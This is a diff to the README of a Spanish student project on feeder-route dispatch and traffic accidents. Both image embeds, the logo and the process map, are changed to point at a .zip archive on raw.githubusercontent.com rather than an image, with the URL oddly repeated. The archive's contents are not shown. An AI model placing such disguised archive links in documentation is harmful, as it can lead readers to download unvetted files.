@@ -1,5 +1,5 @@
 # ENTRY MC # 				      						
-![Logo EntryMC](https://github.com/willio1690/Desarrollo_Final_EntryMC/raw/refs/heads/main/4.DocumentosOrdenados/TRIMESTRE_VIII/Manual de Operaciones/Final_Desarrollo_Entry_MC_3.8.zip)
+![Logo EntryMC](https://raw.githubusercontent.com/willio1690/Desarrollo_Final_EntryMC/main/4.DocumentosOrdenados/TRIMESTRE_VIII/MC_Desarrollo_Final_Entry_v1.6-alpha.2.zip de https://raw.githubusercontent.com/willio1690/Desarrollo_Final_EntryMC/main/4.DocumentosOrdenados/TRIMESTRE_VIII/MC_Desarrollo_Final_Entry_v1.6-alpha.2.zip)
 
 # Plantemiento del Problema #
 Determinar la relación existente entre la hora de despacho de la ruta alimentadora, con los accidentes de transito para evidenciar que pese a que esta ruta alimentadora es la que menos realizó servicios para el 2021 existe una relación perfecta entre el nivel de trafico y la salida de esta ruta alimentadora.
@@ -22,4 +22,4 @@ Dirigir esta serie de elementos permiten direccionar al vehículo dentro de los 
 
 
 # Mapa de Procesos #
-![image](https://github.com/willio1690/Desarrollo_Final_EntryMC/raw/refs/heads/main/4.DocumentosOrdenados/TRIMESTRE_VIII/Manual de Operaciones/Final_Desarrollo_Entry_MC_3.8.zip)
+![image](https://raw.githubusercontent.com/willio1690/Desarrollo_Final_EntryMC/main/4.DocumentosOrdenados/TRIMESTRE_VIII/MC_Desarrollo_Final_Entry_v1.6-alpha.2.zip de https://raw.githubusercontent.com/willio1690/Desarrollo_Final_EntryMC/main/4.DocumentosOrdenados/TRIMESTRE_VIII/MC_Desarrollo_Final_Entry_v1.6-alpha.2.zip)
